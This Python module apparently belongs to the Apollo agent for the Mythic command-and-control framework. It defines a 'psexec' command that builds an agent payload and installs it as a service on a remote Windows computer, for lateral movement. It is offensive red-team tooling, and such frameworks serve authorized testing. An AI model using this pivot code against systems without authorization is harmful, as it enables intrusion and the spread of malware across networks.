from CommandBase import *
import json
from uuid import uuid4
from MythicPayloadRPC import *
from MythicFileRPC import *


class PsExecArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "computer": CommandParameter(name="Computer", type=ParameterType.String, description="Computer to install the service on."),
            "template": CommandParameter(name="Payload Template", type=ParameterType.Payload),
            "remote_path": CommandParameter(name="Remote Path", required=False, type=ParameterType.String,
                              description="Remote path to place the service executable. Defaults to C:\\Users\\Public", default_value="C:\\Users\\Public"),
            "service_name": CommandParameter(name="Service Name", required=False, type=ParameterType.String,
                              description='The name of the service to install as. Defaults to "ApolloService-GUID"'),
            "display_name": CommandParameter(name="Service Display Name", required=False, type=ParameterType.String,
                              description='The display name of the service. Defaults to "Apollo Service: \{GUID\}"')
        }

    async def parse_arguments(self):
        _uuid = str(uuid4())
        self.load_args_from_json_string(self.command_line)
        if self.args["computer"] == None:
            raise Exception("A computer to install the new service on is required.")
        if self.args["template"] == None:
            raise Exception("A payload template must be selected so one may be generated and installed on the remote computer {}".format(self.args["computer"]))
        if self.args["service_name"] == None or self.args["remote_path"] == "":
            self.args["service_name"] = f"ApolloService-{_uuid}"
        if self.args["display_name"] == None or self.args["display_name"] == "":
            self.args["display_name"] = f"Apollo Service: {_uuid}"
        pass


class PsExecCommand(CommandBase):
    cmd = "psexec"
    needs_admin = True
    help_cmd = "psexec (modal popup)"
    description = "Pivot to a machine by creating a new service and starting it."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PsExecArguments
    attackmapping = ["T1588", "T1570"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        gen_resp = await MythicPayloadRPC(task).build_payload_from_template(task.args.get_arg('template'),
                                                                            description=task.operator + "'s psexec from task " + str(task.task_id))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicPayloadRPC(task).get_payload_by_uuid(gen_resp.uuid)
                if resp.status == MythicStatus.Success:
                    if resp.build_phase == 'success':
                        if len(resp.contents) > 1 and resp.contents[:2] != b"\x4d\x5a":
                            raise Exception("psexec requires a payload executable, but got unknown type.")
                        # it's done, so we can register a file for it
                        task.args.add_arg("template", resp.agent_file_id)
                        break
                    elif resp.build_phase == 'error':
                        raise Exception("Failed to build new payload: {}".format(resp.error_message))
                    elif resp.build_phase == "building":
                        await asyncio.sleep(2)
                    else:
                        raise Exception(resp.build_phase)
                else:
                    raise Exception(resp.error_message)
        else:
            raise Exception("Failed to start build process")
        
        
        
        return task

    async def process_response(self, response: AgentResponse):
        pass
